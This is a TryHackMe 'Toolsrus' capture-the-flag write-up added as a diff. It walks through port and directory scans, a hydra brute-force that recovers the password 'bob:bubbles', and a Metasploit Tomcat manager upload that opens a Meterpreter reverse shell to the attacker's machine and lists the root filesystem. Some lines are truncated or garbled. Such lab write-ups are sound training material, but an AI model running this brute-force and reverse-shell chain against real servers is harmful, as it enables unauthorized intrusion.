@@ -1,0 +1,176 @@
+Today we have another challenge from TryHackMe to do revision on listed as an easy named Toolsrus.
+
+Main IP :: 10.49.177.7
+
+We will start with all port scan with nmap.
+
+Nmap scan report for ip-10-49-177-7.ap-south-1.compute.internal (10.49.177.7)
+Host is up (0.00011s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1234/tcp open  hotline
+8009/tcp open  ajp13
+
+Let's now perform service and version detection scan.
+
+Nmap scan report for ip-10-49-177-7.ap-south-1.compute.internal (10.49.177.7)
+Host is up (0.00028s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:ea:e5:d1:29:75:cd:e3:fe:c2:dd:3e:9c:66:01:8e (RSA)
+|   256 66:81:56:c1:a3:ab:cc:0b:46:35:d2:c7:5f:9e:42:2f (ECDSA)
+|_  256 5b:b9:51:d0:ca:81:fc:b3:10:61:0a:83:02:d6:80:3d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/7.0.88
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache-Coyote/1.1
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+After giving some of the basics answers we will move with further more processes also starting with port 80 says that site is unavailable kind of something which speeches useless.
+
+01:~# gobuster dir -u http://10.49.177.7/ -w /usr/share/wordlists/dirb/big.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.49.177.7/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 295]
+/.htpasswd            (Status: 403) [Size: 295]
+/guidelines           (Status: 301) [Size: 315] [--> http://10.49.177.7/guidelines/]
+/protected            (Status: 401) [Size: 458]
+/server-status        (Status: 403) [Size: 299]
+Progress: 20469 / 20470 (100.00%)
+===============================================================
+Finished
+
+we have the answer-1 also and let's move to the directories that are listed.
+
+Hey bob, did you update that TomCat server? and we see this on port 80
+
+oot@ip-10-49-110-201:~# nikto -h http://10.49.177.7:1234/
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.49.177.7
++ Target Hostname:    ip-10-49-177-7.ap-south-1.compute.internal
++ Target Port:        1234
++ Start Time:         2026-06-04 04:51:16 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1525702562000 
++ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ Cookie JSESSIONID created without the httponly flag
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ /manager/html: Default Tomcat Manager interface found
++ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2026-06-04 04:51:26 (GMT0) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+we tried /protected too on the port 80 but it says it moved to different port so we did this and we have manager/html listing here.
+
+hydra -l bob -P /usr/share/wordlist -f 10.49.177.7 http-get /protected
+ -t 4 -V.
+
+14344398 [child 0] (0/0)
+[80][http-get] host: 10.49.177.7   login: bob   password: bubbles
+[STATUS] att
+
+so this password worked and we are into the web-page.
+
+ > set Httppassword bubbles
+Httppassword => bubbles
+msf exploit(multi/http/tomcat_mgr_upload) > run
+[*] Started reverse TCP handler on 10.49.110.201:4444 
+[*] Retrieving session ID and CSRF token...
+[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
+[*] Exploit completed, but no session was created.
+msf exploit(multi/http/tomcat_mgr_upload) > set httpusername bob
+httpusername => bob
+msf exploit(multi/http/tomcat_mgr_upload) > run
+[*] Started reverse TCP handler on 10.49.110.201:4444 
+[*] Retrieving session ID and CSRF token...
+[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
+[*] Exploit completed, but no session was created.
+msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
+RPORT => 1234
+msf exploit(multi/http/tomcat_mgr_upload) > 
+msf exploit(multi/http/tomcat_mgr_upload) > exploit 
+[*] Started reverse TCP handler on 10.49.110.201:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Finding CSRF token...
+[*] Uploading and deploying VlMyi...
+[*] Uploading 6208 bytes as VlMyi.war ...
+[*] Executing VlMyi...
+[*] Executing /VlMyi/ApEjUQ3jrWdoJ3u9seWsnFh.jsp...
+[*] Finding CSRF token...
+[*] Undeploying VlMyi ...
+[*] Sending stage (58073 bytes) to 10.49.177.7
+[*] Undeployed at /manager/html/undeploy
+[*] Meterpreter session 1 opened (10.49.110.201:4444 -> 10.49.177.7:53966) at 2026-06-04 05:09:14 +0000
+
+ls
+meterpreter > ls
+sheListing: /
+==========
+
+Mode            Size      Type  Last modified          Name
+----            ----      ----  -------------          ----
+100667/rw-rw-r  190       fil   2026-06-04 04:40:11 +  .badr-info
+wx                              0000
+040776/rwxrwxr  4096      dir   2019-03-11 06:13:25 +  bin
+w-                              0000
+040776/rwxrwxr  4096      dir   2019-03-11 06:13:35 +  boot
+w-                              0000
+040776/rwxrwxr  3280      dir   2026-06-04 04:40:02 +  dev
+w-                              0000
+040776/rwxrwxr  4096      dir   2026-06-04 04:40:13 +  etc
+w-                              0000
+040776/rwxrwxr  4096      dir   2026-06-04 04:40:13 +  home
+w-                              0000
+100666/rw-rw-r  12713476  fil   2019-03-11 06:13:35 +  initrd.img
+w-                              0000
+040776/rwxrwxr  4096      dir   2019-02-12 17:47:22 +  lib
+w-                              0000
+040776/rwxrwxr  4096      dir   2019-02-12 17:28:02 +  lib64
+w-                              0000
+040776/rwxrwxr  16384     dir   2019-02-12 17:37:53 +  lost+found
+w-                              0000
+040776/rwxrwxr  4096      dir   2019-02-12 17:27:12 +  media
+w-                              0000
+040776/rwxrwxr  4096      dir   2019-02-12 17:27:12 +  mnt
+w-                              0000
+040776/rwxrwxr  4096      dir   2019-02
+
+and now we have the shell.
+
+And from /root/flag.txt we can have the file.
